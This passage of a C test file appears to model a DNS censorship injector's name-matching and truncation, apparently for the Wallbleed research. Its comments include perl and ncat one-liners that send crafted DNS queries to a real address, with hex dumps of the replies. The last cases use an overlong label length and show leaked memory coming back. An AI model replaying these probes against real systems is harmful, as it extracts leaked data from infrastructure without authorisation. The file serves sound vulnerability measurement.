// 16 + 16*6 + len(".facebook.com") == 125
// Note: this query also gets a response from an injector other than the
// Wallbleed one.
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" . "\x10aaaaaaaaaaaaaaaa" . "\x0faaaaaaaaaaaaaaa"x6 . "\x08facebook\x03com\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 10 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 61 08 66 61   aaaaaaaa aaaaa.fa
[0080]   63 65 62 6F 6F 6B 03 63   6F 6D 00 00 01 00 01      cebook.c om.....
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 10 61 61 61   33...... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 61 08 66 61   aaaaaaaa aaaaa.fa
[0080]   63 65 62 6F 6F 6B 03 63   6F 6D 00 00 01 00 01 C0   cebook.c om......
[0090]   0C 00 01 00 01 00 00 00   75 00 04 6C A0 AA 2B      ........ u..l..+
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x10" "aaaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x03" "com" "\x00" "\x00\x01\x00\x01", true,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"
	"\x10" "aaaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x03" "com" "\x00" "\x00\x01\x00\x01" A_SUFFIX
),
// A name of length 126 or greater that ends in ".facebook.com" should not be
// matched.
// 17 + 16*6 + len(".facebook.com") == 126
// Note: this query gets a response, but from an injector other than the
// Wallbleed one.
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" . "\x11aaaaaaaaaaaaaaaaa" . "\x0faaaaaaaaaaaaaaa"x6 . "\x08facebook\x03com\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 11 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 08 66   aaaaaaaa aaaaaa.f
[0080]   61 63 65 62 6F 6F 6B 03   63 6F 6D 00 00 01 00 01   acebook. com.....
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x11" "aaaaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x03" "com" "\x00" "\x00\x01\x00\x01", true,
	""
),
// Non-matching name that, when truncated to 125 bytes, ends in
// ".facebook.com", should matched.
// 16 + 16*6 + len(".facebook.com") == 125, then followed by ".extra"
// Note that A_SUFFIX in the response comes immediately after "extr", with no
// empty label, QTYPE, or QCLASS.
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" . "\x10aaaaaaaaaaaaaaaa" . "\x0faaaaaaaaaaaaaaa"x6 . "\x08facebook\x03com\x05extra\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 10 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 61 08 66 61   aaaaaaaa aaaaa.fa
[0080]   63 65 62 6F 6F 6B 03 63   6F 6D 05 65 78 74 72 61   cebook.c om.extra
[0090]   00 00 01 00 01                                      .....
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 10 61 61 61   33...... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 61 08 66 61   aaaaaaaa aaaaa.fa
[0080]   63 65 62 6F 6F 6B 03 63   6F 6D 05 65 78 74 72 C0   cebook.c om.extr.
[0090]   0C 00 01 00 01 00 00 00   87 00 04 17 EA 1E 3A      ........ ......:
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x10" "aaaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x03" "com" "\x05" "extra" "\x00" "\x00\x01\x00\x01", true,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"
	"\x10" "aaaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x03" "com" "\x05" "extr" A_SUFFIX
),
// Truncating to 125 bytes so that the name ends in ".facebook.com." should
// also match.
// 15 + 16*6 + len(".facebook.com") == 124, then followed by ".extra"
// Note that A_SUFFIX in the response comes immediately after "extr", with no
// empty label, QTYPE, or QCLASS.
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" . "\x0faaaaaaaaaaaaaaa" . "\x0faaaaaaaaaaaaaaa"x6 . "\x08facebook\x03com\x05extra\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 0F 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 08 66 61 63   aaaaaaaa aaaa.fac
[0080]   65 62 6F 6F 6B 03 63 6F   6D 05 65 78 74 72 61 00   ebook.co m.extra.
[0090]   00 01 00 01                                         ....
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 0F 61 61 61   33...... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 08 66 61 63   aaaaaaaa aaaa.fac
[0080]   65 62 6F 6F 6B 03 63 6F   6D 05 65 78 74 72 C0 0C   ebook.co m.extr..
[0090]   00 01 00 01 00 00 00 F6   00 04 6C A0 A6 8E         ........ ..l...
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x03" "com" "\x05" "extra" "\x00" "\x00\x01\x00\x01", true,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"
	"\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x03" "com" "\x05" "extr" A_SUFFIX
),
// (But a literal dot character ending the final label is not the same as a
// real label separator there, and should not match.)
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" . "\x0eaaaaaaaaaaaaaa" . "\x0faaaaaaaaaaaaaaa"x6 . "\x08facebook\x09com.extra\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 0E 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0020]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0030]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0040]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0050]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0060]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0070]   61 61 61 61 61 61 61 61   61 61 61 08 66 61 63 65   aaaaaaaa aaa.face
[0080]   62 6F 6F 6B 09 63 6F 6D   2E 65 78 74 72 61 00 00   book.com .extra..
[0090]   01 00 01                                            ...
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x09" "com.extra" "\x00" "\x00\x01\x00\x01", true,
	""
),
// Truncating to end in ".facebook.com.e" should not match.
// 14 + 16*6 + len(".facebook.com") == 123, then followed by ".extra"
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" . "\x0eaaaaaaaaaaaaaa" . "\x0faaaaaaaaaaaaaaa"x6 . "\x08facebook\x03com\x05extra\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 0E 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0020]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0030]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0040]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0050]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0060]   61 61 61 61 61 61 61 61   61 61 61 0F 61 61 61 61   aaaaaaaa aaa.aaaa
[0070]   61 61 61 61 61 61 61 61   61 61 61 08 66 61 63 65   aaaaaaaa aaa.face
[0080]   62 6F 6F 6B 03 63 6F 6D   05 65 78 74 72 61 00 00   book.com .extra..
[0090]   01 00 01                                            ...
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x0e" "aaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x03" "com" "\x05" "extra" "\x00" "\x00\x01\x00\x01", true,
	""
),
// And ending in ".facebook.co" should not match.
// 17 + 16*6 + len(".facebook.com") == 126, then followed by ".extra"
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" . "\x11aaaaaaaaaaaaaaaaa" . "\x0faaaaaaaaaaaaaaa"x6 . "\x08facebook\x03com\x05extra\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 11 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 08 66   aaaaaaaa aaaaaa.f
[0080]   61 63 65 62 6F 6F 6B 03   63 6F 6D 05 65 78 74 72   acebook. com.extr
[0090]   61 00 00 01 00 01                                   a.....
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x11" "aaaaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x03" "com" "\x05" "extra" "\x00" "\x00\x01\x00\x01", true,
	""
),
// Another way of making a name that ends in ".facebook.com" when truncated to
// 125 bytes. Here, the untruncated name ends in ".facebook.comextra", with no
// label separator after the ".com".
// 16 + 16*6 + len(".facebook.com") == 125, then followed by "extra"
// Note that A_SUFFIX in the response comes immediately after "comextr", with
// no empty label, QTYPE, or QCLASS.
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" . "\x10aaaaaaaaaaaaaaaa" . "\x0faaaaaaaaaaaaaaa"x6 . "\x08facebook\x08comextra\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 10 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 61 08 66 61   aaaaaaaa aaaaa.fa
[0080]   63 65 62 6F 6F 6B 08 63   6F 6D 65 78 74 72 61 00   cebook.c omextra.
[0090]   00 01 00 01                                         ....
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 10 61 61 61   33...... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 61 0F 61 61   aaaaaaaa aaaaa.aa
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 61 08 66 61   aaaaaaaa aaaaa.fa
[0080]   63 65 62 6F 6F 6B 08 63   6F 6D 65 78 74 72 C0 0C   cebook.c omextr..
[0090]   00 01 00 01 00 00 00 DF   00 04 9D F0 0C 05         ........ ......
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x10" "aaaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x08" "comextra" "\x00" "\x00\x01\x00\x01", true,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"
	"\x10" "aaaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x08" "comextr" A_SUFFIX
),
// But ending in ".facebook.come" should not match.
// 15 + 16*6 + len(".facebook.com") == 124, then followed by "extra"
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" . "\x0faaaaaaaaaaaaaaa" . "\x0faaaaaaaaaaaaaaa"x6 . "\x08facebook\x08comextra\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 0F 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 0F 61 61 61   aaaaaaaa aaaa.aaa
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 08 66 61 63   aaaaaaaa aaaa.fac
[0080]   65 62 6F 6F 6B 08 63 6F   6D 65 78 74 72 61 00 00   ebook.co mextra..
[0090]   01 00 01                                            ...
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x08" "comextra" "\x00" "\x00\x01\x00\x01", true,
	""
),
// And this way of ending in ".facebook.co" should not match.
// 17 + 16*6 + len(".facebook.com") == 126, then followed by "extra"
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" . "\x11aaaaaaaaaaaaaaaaa" . "\x0faaaaaaaaaaaaaaa"x6 . "\x08facebook\x08comextra\x00\x00\x01\x00\x01"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 11 61 61 61   33. .... .....aaa
[0010]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0020]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0030]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0040]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0050]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0060]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 0F 61   aaaaaaaa aaaaaa.a
[0070]   61 61 61 61 61 61 61 61   61 61 61 61 61 61 08 66   aaaaaaaa aaaaaa.f
[0080]   61 63 65 62 6F 6F 6B 08   63 6F 6D 65 78 74 72 61   acebook. comextra
[0090]   00 00 01 00 01                                      .....
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00"
	"\x11" "aaaaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa" "\x0f" "aaaaaaaaaaaaaaa"
	"\x08" "facebook" "\x08" "comextra" "\x00" "\x00\x01\x00\x01", true,
	""
),

/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\xffrsf.org\x00"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
With digest:
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 FF 72 73 66   33. .... .....rsf
[0010]   2E 6F 72 67 00                                      .org.
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 FF 72 73 66   33...... .....rsf
[0010]   2E 6F 72 67 00 3D 8A 48   2E 4E 54 52 4F 4C 3A 20   .org.=.H .NTROL: 
[0020]   6D 61 78 2D 61 67 65 3D   33 36 30 30 0D 0A 44 41   max-age= 3600..DA
[0030]   54 45 3A 20 54 75 65 2C   20 31 35 20 46 65 62 20   TE: Tue,  15 Feb 
[0040]   32 30 32 32 20 32 33 3A   33 33 3A 32 38 20 47 4D   2022 23: 33:28 GM
[0050]   54 0D 0A 45 58 54 3A 0D   0A 4C 4F 43 41 54 49 4F   T..EXT:. .LOCATIO
[0060]   4E 3A 20 68 74 74 70 3A   2F 2F 32 31 39 2E 31 33   N: http: //219.13
[0070]   39 2E 31 36 30 2E 35 36   3A 38 30 2F 75 70 6E 70   9.160.56 :80/upnp
[0080]   64 65 76 69 63 65 64 65   73 63 2E 78 6D 6C C0 0C   devicede sc.xml..
[0090]   00 01 00 01 00 00 00 BB   00 04 60 2C 89 1C         ........ ..`,..
Without digest:
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 FF 72 73 66   33. .... .....rsf
[0010]   2E 6F 72 67 00                                      .org.
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 FF 72 73 66   33...... .....rsf
[0010]   2E 6F 72 67 00 48 6F 73   74 3A 32 33 39 2E 32 35   .org.Hos t:239.25
[0020]   35 2E 32 35 35 2E 32 35   30 3A 31 39 30 30 0D 0A   5.255.25 0:1900..
[0030]   53 54 3A 73 73 64 70 3A   61 6C 6C 0D 0A 4D 61 6E   ST:ssdp: all..Man
[0040]   3A 22 73 73 64 70 3A 64   69 73 63 6F 76 65 72 22   :"ssdp:d iscover"
[0050]   0D 0A 4D 58 3A 33 0D 0A   0D 0A 4C 07 24 E1 FF AF   ..MX:3.. ..L.$...
[0060]   F7 72 C7 36 9D 94 50 6C   2D 8D 92 8F 22 3F D1 2D   .r.6..Pl -..."?.-
[0070]   84 E1 00 F5 32 45 BE 90   8A DA B5 D5 9F 81 7A 17   ....2E.. ......z.
[0080]   ED CA DF F8 82 CF 2E 6F   CA BC 77 88 91 98 C0 0C   .......o ..w.....
[0090]   00 01 00 01 00 00 00 54   00 04 67 F0 B4 75         .......T ..g..u
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\xff" "rsf.org" "\x00", true,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\xff" "rsf.org" "\x00" "DDDD" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\xff" "rsf.org" "\x00", false,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\xff" "rsf.org" "\x00" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
/*
